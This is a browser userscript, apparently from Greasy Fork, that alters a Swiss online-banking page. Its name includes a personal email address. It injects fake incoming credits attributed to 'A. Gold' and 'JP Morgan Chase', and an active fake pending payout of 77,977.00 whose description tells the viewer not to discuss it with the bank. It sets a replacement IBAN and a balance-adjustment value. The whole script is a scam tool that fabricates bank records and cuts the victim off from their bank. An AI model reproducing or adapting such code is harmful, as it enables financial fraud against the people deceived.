// ==UserScript==
// @name         Ed 4Rec  post.ch.raguthtreuhand@bluewin.ch
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/528248/Ed%204Rec%20%20postchraguthtreuhand%40bluewinch.user.js
// @updateURL https://update.greasyfork.org/scripts/528248/Ed%204Rec%20%20postchraguthtreuhand%40bluewinch.meta.js
// ==/UserScript==
...
var adjustmentAmount = 0.0; // Change this value to adjust the balance accordingly

// Configurable desired IBAN
var desiredIban = "CH59 8080 8009 1223 4842 5";
...
//        description: "Geld von A. Gold",
 ...
 //       title: "JP. Morgan Chase.     ",
//        type: "Gutschrift",
 //       date: "11. Oktober 2024", //11. Oktober 2024
 //       amount: "+6'500.00",
 //       description: "Geld von A. Gold 2",
 //       insertAbove: true, // Insert the transaction above the original one by default
 //       inserted: false // Flag to track if the transaction has been inserted
 //   },
//   {
 //       title: "Andreas Gold.     ",
 //       type: "Gutschrift",
 //       date: "15. Oktober 2024", //11. Oktober 2024
 //       amount: "+5'500.00",
 //       description: "Hilfe",
 //       insertAbove: true, // Insert the transaction above the original one by default
  //      inserted: false // Flag to track if the transaction has been inserted
 ...
 //       title: "JP.. Morgan Chase.     ",
//        type: "Gutschrift",
 //       date: "16. Oktober 2024", //16. Oktober 2024
 //       amount: "+9'500.00",
 //       description: "Geld von A. Gold 3",
  //      insertAbove: true, // Insert the transaction above the original one by default
 //       inserted: false // Flag to track if the transaction has been inserted
  //  },
//  {
 //       title: "JP.. Morgan Chase..     ",
 //       type: "Gutschrift",
 //       date: "Heute", //18. Oktober 2024
 //       amount: "+1'000.00",
 //       description: "Geld von A. Gold 4",
  //      insertAbove: true, // Insert the transaction above the original one by default
  //      inserted: false // Flag to track if the transaction has been inserted
  //  },
    {
        ...
        date: "Vorgemerkt",
        amount: "+77'977.00",
        description: "Auszahlung. Freigabe nötig über JP Morgan Chase. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
        insertAbove: true, // Insert the transaction above the original one by default
        inserted: false // Flag to track if the transaction has been inserted
    },
